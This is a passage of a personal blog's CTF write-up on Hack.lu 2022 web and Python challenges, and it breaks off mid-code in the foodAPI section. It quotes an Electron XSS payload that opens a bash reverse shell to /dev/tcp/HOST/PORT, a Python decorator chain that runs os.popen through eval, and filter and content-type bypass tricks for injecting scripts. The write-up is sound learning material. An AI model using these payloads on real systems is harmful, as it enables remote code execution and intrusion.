<!DOCTYPE html>
<html class="has-navbar-fixed-top" lang="en">
<head>
    <meta charset="utf-8">
<title>Hack.lu CTF 2022 Notes - Huli&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1">



            
<link href="https://blog.huli.tw/2022/10/31/hacklu-ctf-2022-writeup/" rel="alternate" hreflang="zh-TW" />
            
    




    
<link rel="canonical" href="https://blog.huli.tw/2022/10/31/en/hacklu-ctf-2022-writeup/">
    





    <meta name="description" content="I was completely lost with the web problems and didn’t solve anything. The quality of the problems was good and I learned a lot of new things, so it’s worth recording. Keywords:  Electron relaunch to">
<meta property="og:type" content="article">
<meta property="og:title" content="Hack.lu CTF 2022 Notes">
<meta property="og:url" content="https://blog.huli.tw/2022/10/31/en/hacklu-ctf-2022-writeup/index.html">
<meta property="og:site_name" content="Huli&#39;s blog">
<meta property="og:description" content="I was completely lost with the web problems and didn’t solve anything. The quality of the problems was good and I learned a lot of new things, so it’s worth recording. Keywords:  Electron relaunch to">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog.huli.tw/img/hacklu-ctf-2022-writeup/cover-en.png">
<meta property="article:published_time" content="2022-10-31T12:05:37.000Z">
<meta property="article:modified_time" content="2023-06-20T05:10:49.055Z">
<meta property="article:author" content="Huli">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.huli.tw/img/hacklu-ctf-2022-writeup/cover-en.png">



<link rel="alternative" href="/atom.xml" title="Hack.lu CTF 2022 Notes" type="application/atom+xml">



<link rel="icon" href="/img/lidemy_logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">


<link rel="stylesheet" href="/css/bulma.css?v=2.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />


<link rel="stylesheet" href="/css/style.css?v=3.css">





    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1393J2EVCZ');
</script>


    


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <script>
        if (localStorage.getItem('dark-mode')) {
            if (localStorage.getItem('dark-mode') === 'true') {
                document.body.classList.add('dark-mode')
            }
        } else {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.body.classList.add('dark-mode')
            }
        }
    </script>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/en">
                
                    
                    Huli&#39;s blog
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/en/archives">Archive</a>
            
            <a class="navbar-item "
               href="/en/categories">Categories</a>
            
            <a class="navbar-item "
               href="/en/about">About</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="Table of Contents">
                    Table of Contents
                </a>
                <div class="navbar-dropdown">
                    
                    
                    
                    
                    <a class="navbar-item" href="#babyelectron21-solves">1&nbsp;&nbsp;<b>babyelectron(21 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#culinary-class-room6-solves">2&nbsp;&nbsp;<b>Culinary Class Room(6 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#yummygifs5-solves">3&nbsp;&nbsp;<b>YummyGIFs(5 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#foodapi4-solves">4&nbsp;&nbsp;<b>foodAPI(4 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#htpl3-solves">5&nbsp;&nbsp;<b>HTPL(3 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#jaason6-solves">6&nbsp;&nbsp;<b>JaaSon(6 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#postscript">7&nbsp;&nbsp;<b>Postscript</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
                
                <i class="fab fa-twitter"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="RSS" href="/atom-en.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                    <defs>
                    </defs>
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                    </g>
                    </svg>
                </div>
            </a>
            
               <a class="navbar-item" href="/2022/10/31/hacklu-ctf-2022-writeup/">中文</a>
            
            

        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
      
      <div data-nosnippet class="self-notice">
        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
      </div>
      
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            Hack.lu CTF 2022 Notes
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2022-10-31T12:05:37.000Z" itemprop="datePublished">31 October 2022</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/en/categories/Security/">Security</a>
        </span>
        
        
        
        <spen data-nosnippet class="column is-narrow">(Translated by ChatGPT)</span>
        
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p>I was completely lost with the web problems and didn’t solve anything. The quality of the problems was good and I learned a lot of new things, so it’s worth recording.</p>
<p>Keywords:</p>
<ol>
<li>Electron relaunch to RCE</li>
<li>Executing code using Python decorator</li>
<li>Preventing Apache from outputting content type header using special file names</li>
<li>GIF + JS polyglot</li>
<li>Bypassing SQLite’s illegal column names</li>
<li>JS comment <code>&lt;!--</code></li>
<li>superjson</li>
</ol>
<span id="more"></span>

<h2><span id="babyelectron21-solves">babyelectron(21 solves)</span></h2><p>Given an Electron app, the goal is to achieve RCE. A bot will visit your page using the app, and you need to find an XSS first, which I won’t discuss here.</p>
<p>All the necessary security settings are enabled for this problem. The key is in the following code in the preload:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> RendererApi <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token function-variable function">invoke</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">action<span class="token punctuation">,</span> <span class="token operator">...</span>args</span><span class="token punctuation">)</span>  <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> ipcRenderer<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"RELaction"</span><span class="token punctuation">,</span>action<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token comment">// SECURITY: expose a limted API to the renderer over the context bridge</span>
<span class="token comment">// https://github.com/1password/electron-secure-defaults/SECURITY.md#rule-3</span>
contextBridge<span class="token punctuation">.</span><span class="token function">exposeInMainWorld</span><span class="token punctuation">(</span><span class="token string">"api"</span><span class="token punctuation">,</span> RendererApi<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>In another JS file, there is this code:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// In this file you can include the rest of your app's specific main process</span>
<span class="token comment">// code. You can also put them in separate files and require them here.</span>

app<span class="token punctuation">.</span><span class="token function-variable function">RELbuy</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">listingId</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span>
<span class="token punctuation">&#125;</span>

app<span class="token punctuation">.</span><span class="token function-variable function">RELsell</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">houseId<span class="token punctuation">,</span> price<span class="token punctuation">,</span> duration</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span>
<span class="token punctuation">&#125;</span>

app<span class="token punctuation">.</span><span class="token function-variable function">RELinfo</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">houseId</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span>
<span class="token punctuation">&#125;</span>

app<span class="token punctuation">.</span><span class="token function-variable function">RElist</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">listingId</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span>
<span class="token punctuation">&#125;</span>

app<span class="token punctuation">.</span><span class="token function-variable function">RELsummary</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">userId</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
 <span class="token keyword">return</span> 
<span class="token punctuation">&#125;</span>

ipcMain<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">"RELaction"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">_e<span class="token punctuation">,</span> action<span class="token punctuation">,</span> args</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>
  <span class="token comment">//if(["RELbuy", "RELsell", "RELinfo"].includes(action))&#123;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^REL</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>action<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    app<span class="token punctuation">[</span>action<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span>  
  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token comment">// ?? </span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>It doesn’t seem to be useful because those methods are not implemented.</p>
<p>But the point is that if you send the <code>relaunch</code> command, it will match, so you can execute <a target="_blank" rel="noopener" href="https://www.electronjs.org/de/docs/latest/api/app#apprelaunchoptions">app.relaunch</a>, and specify the executable file location during relaunch to achieve RCE.</p>
<p>Payload provided by zeyu2001 in DC:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>
  <span class="token string-property property">"houseId"</span><span class="token operator">:</span><span class="token string">"..."</span><span class="token punctuation">,</span>
  <span class="token string-property property">"token"</span><span class="token operator">:</span><span class="token string">"..."</span><span class="token punctuation">,</span>
  <span class="token string-property property">"message"</span><span class="token operator">:</span><span class="token string">"&lt;img src=x onerror=\"window.api.invoke('relaunch',&#123;execPath: 'bash', args: ['-c', 'bash -i >&amp; /dev/tcp/HOST/PORT 0>&amp;1']&#125;)\">"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"price"</span><span class="token operator">:</span><span class="token string">""</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Sudistark’s writeup: <a target="_blank" rel="noopener" href="https://github.com/Sudistark/CTF-Writeups/blob/main/2022/Hack.lu/babyelectron.md">https://github.com/Sudistark/CTF-Writeups/blob/main/2022/Hack.lu/babyelectron.md</a></p>
<h2><span id="culinary-class-room6-solves">Culinary Class Room(6 solves)</span></h2><p>You are limited to adding a maximum of 250 decorators to one class, and they cannot have parameters. The goal is to execute any code and obtain the flag.</p>
<p>The author’s solution is to find a list and push a lot of numbers into it, and then throw it into bytes and then into eval to execute. For example, the following code will push the number 112 into <code>copyright._Printer__filenames</code>.</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>append</span>
<span class="token decorator annotation punctuation">@memoryview<span class="token punctuation">.</span>__basicsize__<span class="token punctuation">.</span>__sub__</span>
<span class="token decorator annotation punctuation">@staticmethod<span class="token punctuation">.</span>__basicsize__<span class="token punctuation">.</span>__mul__</span>
<span class="token decorator annotation punctuation">@object<span class="token punctuation">.</span>__instancecheck__</span>
<span class="token keyword">class</span> <span class="token class-name">a</span><span class="token punctuation">:</span><span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The payload posted by Arusekk in DC:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@print</span>
<span class="token decorator annotation punctuation">@list</span>
<span class="token decorator annotation punctuation">@eval</span>
<span class="token decorator annotation punctuation">@bytes</span>
<span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>__add__</span>
<span class="token decorator annotation punctuation">@list</span>
<span class="token decorator annotation punctuation">@str<span class="token punctuation">.</span>encode</span>
<span class="token decorator annotation punctuation">@chr</span>
<span class="token decorator annotation punctuation">@len</span>
<span class="token decorator annotation punctuation">@StopAsyncIteration<span class="token punctuation">.</span>__doc__<span class="token punctuation">.</span>format</span>
<span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>append</span>
<span class="token decorator annotation punctuation">@len</span>
<span class="token decorator annotation punctuation">@OSError<span class="token punctuation">.</span>__doc__<span class="token punctuation">.</span>format</span>
<span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>append</span>
<span class="token decorator annotation punctuation">@len</span>
<span class="token decorator annotation punctuation">@len<span class="token punctuation">.</span>__doc__<span class="token punctuation">.</span>format</span>
<span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>extend</span>
<span class="token decorator annotation punctuation">@str<span class="token punctuation">.</span>encode</span>
<span class="token decorator annotation punctuation">@int<span class="token punctuation">.</span>real<span class="token punctuation">.</span>__name__<span class="token punctuation">.</span>strip</span>
<span class="token decorator annotation punctuation">@len<span class="token punctuation">.</span>__name__<span class="token punctuation">.</span>format</span>
<span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>append</span>
<span class="token decorator annotation punctuation">@len</span>
<span class="token decorator annotation punctuation">@ValueError<span class="token punctuation">.</span>__doc__<span class="token punctuation">.</span>format</span>
<span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>append</span>
<span class="token decorator annotation punctuation">@len</span>
<span class="token decorator annotation punctuation">@Exception<span class="token punctuation">.</span>__doc__<span class="token punctuation">.</span>format</span>
<span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>append</span>
<span class="token decorator annotation punctuation">@len</span>
<span class="token decorator annotation punctuation">@OSError<span class="token punctuation">.</span>__doc__<span class="token punctuation">.</span>format</span>
<span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>append</span>
<span class="token decorator annotation punctuation">@len</span>
<span class="token decorator annotation punctuation">@StopIteration<span class="token punctuation">.</span>__doc__<span class="token punctuation">.</span>format</span>
<span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>extend</span>
<span class="token decorator annotation punctuation">@str<span class="token punctuation">.</span>encode</span>
<span class="token decorator annotation punctuation">@open<span class="token punctuation">.</span>__name__<span class="token punctuation">.</span>format</span>
<span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>append</span>
<span class="token decorator annotation punctuation">@len</span>
<span class="token decorator annotation punctuation">@set<span class="token punctuation">.</span>__doc__<span class="token punctuation">.</span>format</span>
<span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>append</span>
<span class="token decorator annotation punctuation">@len</span>
<span class="token decorator annotation punctuation">@Exception<span class="token punctuation">.</span>__doc__<span class="token punctuation">.</span>format</span>
<span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>extend</span>
<span class="token decorator annotation punctuation">@str<span class="token punctuation">.</span>encode</span>
<span class="token decorator annotation punctuation">@__import__<span class="token punctuation">.</span>__name__<span class="token punctuation">.</span>__add__</span>
<span class="token decorator annotation punctuation">@str</span>
<span class="token decorator annotation punctuation">@tuple</span>
<span class="token decorator annotation punctuation">@str<span class="token punctuation">.</span>split</span>
<span class="token decorator annotation punctuation">@str<span class="token punctuation">.</span>lower</span>
<span class="token decorator annotation punctuation">@OSError<span class="token punctuation">.</span>__name__<span class="token punctuation">.</span>rstrip</span>
<span class="token decorator annotation punctuation">@TypeError<span class="token punctuation">.</span>__name__<span class="token punctuation">.</span>format</span>
<span class="token keyword">class</span> <span class="token class-name">room</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The above code is doing:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">b'__import__("os",).popen("./rea*")'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Because I am extremely unfamiliar with Python, I need to learn it quickly.</p>
<p><code>__doc__</code> can get the documentation of a method, which needs to be declared in the source code, like this:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token triple-quoted-string string">"""hello"""</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>test<span class="token punctuation">.</span>__doc__<span class="token punctuation">)</span> <span class="token comment"># hello</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>Python has such a useful feature, which seems quite practical in development, and it should be easier to output it as a file.</p>
<p>In Python, <code>__builtins__</code> can be used to get all built-in things, which feels a bit like the global in js, and you can see what can be used.</p>
<p>Using <code>dir()</code> can list all attributes, so you can write a recursive function to find the list, like this:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">visited <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">for</span> name <span class="token keyword">in</span> <span class="token builtin">dir</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">:</span>
    item <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> name<span class="token punctuation">)</span>
    new_path <span class="token operator">=</span> path <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> name
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span>new_path<span class="token punctuation">)</span>
      <span class="token keyword">return</span>
    <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token keyword">not</span> <span class="token keyword">in</span> visited<span class="token punctuation">:</span>
      visited<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span>
      search<span class="token punctuation">(</span>item<span class="token punctuation">,</span> new_path<span class="token punctuation">)</span>
      
search<span class="token punctuation">(</span>__builtins__<span class="token punctuation">,</span> <span class="token string">"__builtins__"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Finally, you will find the list <code>__builtins__.copyright._Printer__filenames</code>.</p>
<p>The solution posted above finds the number and then uses <code>@copyright._Printer__filenames.append</code> to add it to the array. The return value is <code>None</code>, and then using the feature that <code>&quot;abc&quot;.format(None)</code> is still “abc”, you can turn the input into the desired string, and then use len to get the number.</p>
<h2><span id="yummygifs5-solves">YummyGIFs(5 solves)</span></h2><p>You can upload a gif (strictly checked to be a gif file) and add a title and description. The description will be filtered and rendered on the screen:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">s</span><span class="token punctuation">(</span><span class="token variable">$input_str</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token variable">$allowed_tags</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'&lt;b>'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;/b>'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;i>'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;/i>'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;u>'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;/u>'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;s>'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;/s>'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$current_str</span> <span class="token operator">=</span> <span class="token variable">$input_str</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$new_str</span> <span class="token operator">=</span> <span class="token function">preg_replace_callback</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/&lt;.*?>/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span> <span class="token keyword">use</span> <span class="token punctuation">(</span><span class="token variable">$allowed_tags</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$allowed_tags</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token variable">$current_str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$new_str</span> <span class="token operator">===</span> <span class="token variable">$current_str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token variable">$new_str</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$current_str</span> <span class="token operator">=</span> <span class="token variable">$new_str</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>It looks strict, but it can actually be bypassed using unclosed tags, like this: <code>&lt;script src=&quot;&quot; p=&quot;</code>. Therefore, any tag can still be inserted.</p>
<p>The next problem is how to make <code>src</code> legal. Due to CSP self, we need to generate a GIF that is both a valid JS code. However, even if it is generated, because the content type is <code>image/gif</code>, the browser will still report an error, which will appear as:</p>
<blockquote>
<p>Refused to execute script from ‘<a target="_blank" rel="noopener" href="http://localhost:1234/a.gif">http://localhost:1234/a.gif</a>‘ because its MIME type (‘image&#x2F;gif’) is not executable.</p>
</blockquote>
<p>The solution is to find a way not to output the content type.</p>
<p>Because this content type is given by Apache, it can be bypassed using the file name, for example, if the file name is <code>..gif</code>, the content type will not be given, as shown in: <a target="_blank" rel="noopener" href="https://twitter.com/YNizry/status/1582733545759330306">https://twitter.com/YNizry/status/1582733545759330306</a></p>
<p>This trick seems worth noting.</p>
<p>As for how to generate a GIF + JS polyglot, you can refer to: <a target="_blank" rel="noopener" href="https://gist.github.com/ajinabraham/f2a057fb1930f94886a3">https://gist.github.com/ajinabraham/f2a057fb1930f94886a3</a></p>
<p>By the way, here is a note on PNG: <a target="_blank" rel="noopener" href="https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html">PERSISTENT PHP PAYLOADS IN PNGS: HOW TO INJECT PHP CODE IN AN IMAGE – AND KEEP IT THERE!</a></p>
<h2><span id="foodapi4-solves">foodAPI(4 solves)</span></h2><p>The core code of this problem is as follows:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">apiRouter<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/food/:id"</span><span class="token punctuation">,</span> <span class="token keyword">async</span><span class="token punctuation">(</span><span class="token parameter">ctx</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> id <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">getQuery</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">mergeParams</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
